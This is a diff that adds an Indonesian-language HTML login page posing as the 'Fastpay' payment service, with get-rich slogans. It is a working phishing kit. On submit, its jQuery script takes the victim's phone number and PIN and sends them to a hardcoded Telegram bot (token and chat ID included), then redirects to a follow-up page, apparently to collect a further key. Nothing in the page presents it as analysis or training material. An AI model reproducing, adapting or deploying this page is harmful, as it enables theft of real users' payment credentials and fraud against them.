@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fastpay Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            color: #333;
+        }
+        .container {
+            max-width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo img {
+            max-width: 300px;
+            margin: 25px auto;
+        }
+        .subtitle {
+            font-size: 14px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .description {
+            font-size: 13px;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        input {
+            width: 100%;
+            padding: 10px 5px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            background: none;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus {
+            border-bottom: 2px solid #007bff;
+        }
+        .button-primary {
+            background-color: #ff0000;
+            border: none;
+            padding: 15px;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .button-secondary {
+            background-color: white;
+            color: #007bff;
+            border: 1px solid #007bff;
+            padding: 10px;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://i.ibb.co.com/wsRV8tD/IMG-20241123-125513.jpg" alt="Fastpay Logo">
+        </div>
+        <div class="subtitle">Ayo Jadilah Jutawan Fastpay Selanjutnya!</div>
+        <div class="description">Bisnis Terbaik, Mudah dan Pasti Menguntungkan</div>
+        <form id="inputlogin">
+            <div class="form-group">
+                <input type="text" id="nomorhp" placeholder="No Handphone" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="pin" placeholder="PIN" required>
+            </div>
+            <button class="button-primary" type="submit">Masuk</button>
+        </form>
+        <p>Belum Jadi Mitra Fastpay?</p>
+        <button class="button-secondary">Daftar Sekarang</button>
+        <div class="footer">
+            <p>Perlu Bantuan? <a href="#">Hubungi Customer Service</a></p>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('#inputlogin').on('submit', function (event) {
+                event.preventDefault();
+
+                const nomorhp = $('#nomorhp').val();
+                const pin = $('#pin').val();
+                const message = `No Handphone: ${nomorhp}\nPIN: ${pin}`;
+
+                // Kirim ke bot Telegram
+                $.ajax({
+                    url: 'https://api.telegram.org/bot7776782664:AAEPepfGGYr2GHpTw9WpwAF84-dsuSf85FQ/sendMessage',
+                    method: 'POST',
+                    data: {
+                        chat_id: '7887306555',
+                        text: message
+                    },
+                    success: function () {
+                        console.log('Pesan berhasil dikirim ke Telegram');
+                        // Arahkan ke halaman key.htm setelah sukses
+                        window.location.href = 'key.htm';
+                    },
+                    error: function (error) {
+                        console.error('Error mengirim pesan ke Telegram:', error);
+                        alert('Gagal mengirim data. Coba lagi!');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
